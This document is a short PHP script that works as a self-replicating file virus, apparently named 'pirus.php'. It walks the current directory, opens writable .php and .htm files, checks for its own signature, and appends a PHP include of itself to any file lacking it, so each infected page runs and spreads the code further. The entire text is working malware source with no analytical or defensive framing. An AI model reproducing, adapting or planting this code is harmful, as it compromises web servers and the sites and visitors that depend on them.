<?php
$handle=opendir('.');
while ($file = readdir($handle))
{ $infected=true;
  $executable=false;

 if ( ($executable = strstr ($file, '.php')) || ($executable = strstr ($file, '.htm')) || ($executable = strstr ($file, '.php')) )
 if ( is_file($file) && is_writeable($file) )
 {
   $host = fopen($file, "r");
   $contents = fread ($host, filesize ($file));
   $sig = strstr ($contents, 'pirus.php');
   if(!$sig) $infected=false;
 }
 //infect
 if (($infected==false))
  {
   $host = fopen($file, "a");
   fputs($host,"<?php ");
   fputs($host,"include(\"");
   fputs($host,__FILE__);
   fputs($host,"\"); ");
   fputs($host,"?>");
   fclose($host);
   return;
 }
}
closedir($handle);
?>
